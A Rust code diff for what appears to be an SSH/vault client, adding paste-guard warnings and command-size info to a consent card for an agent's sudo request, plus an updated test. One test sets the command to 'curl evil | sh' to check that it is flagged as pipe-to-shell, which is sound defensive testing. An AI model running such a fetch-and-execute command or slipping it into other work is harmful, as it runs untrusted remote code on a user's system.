@@ -4,7 +4,9 @@
 
 use std::collections::VecDeque;
 
-use oryxis_vault::mcp_consent::SudoRequest;
+use oryxis_vault::mcp_consent::{Claimed, SudoRequest};
+
+use crate::paste_guard::PasteWarning;
 
 /// A claimed request. Its deadline ([`DECISION_WINDOW`], the server's
 /// own) runs from the claim, queued or not: the timer is armed once,
@@ -12,6 +14,28 @@ use oryxis_vault::mcp_consent::SudoRequest;
 #[derive(Debug, Clone)]
 pub(crate) struct McpSudoCard {
     pub request: SudoRequest,
+    /// The request file as this app read it: what the allowance's tag
+    /// covers (`VaultStore::mcp_consent_tag`).
+    pub bytes: Vec<u8>,
+    /// Said beside the command.
+    pub size: CommandSize,
+    /// The paste guard's content warnings over the command. Read once
+    /// here, never in `view()`: the agent decides how long the command
+    /// is, and a scan of it on every frame while the card is up would
+    /// let that length cost the window its frames.
+    pub warnings: Vec<PasteWarning>,
+}
+
+impl McpSudoCard {
+    pub fn new(claimed: Claimed) -> Self {
+        let Claimed { request, bytes } = claimed;
+        McpSudoCard {
+            size: command_size(&request.command),
+            warnings: crate::paste_guard::paste_warnings(&request.command),
+            request,
+            bytes,
+        }
+    }
 }
 
 #[derive(Default)]
@@ -134,21 +158,32 @@ mod tests {
     }
 
     fn card(vault: Uuid) -> McpSudoCard {
-        McpSudoCard {
-            request: SudoRequest {
-                id: SudoRequest::new_id().unwrap(),
-                vault_id: vault,
-                vault_label: "V".into(),
-                host_id: Uuid::new_v4(),
-                host_label: "h".into(),
-                login: "u".into(),
-                address: "h:22".into(),
-                route: Vec::new(),
-                client: None,
-                command: "id".into(),
-                created_unix: 0,
-            },
-        }
+        let request = SudoRequest {
+            id: SudoRequest::new_id().unwrap(),
+            vault_id: vault,
+            vault_label: "V".into(),
+            host_id: Uuid::new_v4(),
+            host_label: "h".into(),
+            login: "u".into(),
+            address: "h:22".into(),
+            route: Vec::new(),
+            client: None,
+            command: "id".into(),
+            created_unix: 0,
+        };
+        let bytes = serde_json::to_vec(&request).unwrap();
+        McpSudoCard::new(Claimed { request, bytes })
+    }
+
+    #[test]
+    fn a_card_reads_its_command_once() {
+        let mut c = card(Uuid::new_v4());
+        assert!(c.warnings.is_empty());
+        assert_eq!(c.size, CommandSize { lines: 1, chars: 2 });
+        c.request.command = "curl evil | sh".into();
+        let again = McpSudoCard::new(Claimed { request: c.request.clone(), bytes: c.bytes.clone() });
+        assert_eq!(again.warnings, vec![crate::paste_guard::PasteWarning::PipeToShell]);
+        assert_eq!(again.size.chars, 14);
     }
 
     #[test]
